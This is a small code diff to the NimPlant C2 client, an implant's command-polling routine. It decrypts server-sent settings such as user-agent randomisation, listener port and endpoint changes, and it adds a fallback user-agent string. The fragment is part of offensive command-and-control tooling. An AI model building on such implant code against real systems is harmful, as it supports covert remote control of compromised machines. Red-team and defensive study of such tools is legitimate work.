@@ -211,6 +211,9 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
         try:
             # check for userAgent status
             li.randomUserAgents = parseBool(decryptData(parseJson(res.body)["s2"].getStr(), li.cryptKey).replace("\'", "\""))
+            # adjust userAgent back in case this is false
+            if not li.randomUserAgents:
+                li.userAgent = "NimPlant C2 Client"
             li.newListenerPort = decryptData(parseJson(res.body)["p3"].getStr(), li.cryptKey)
             li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))
 
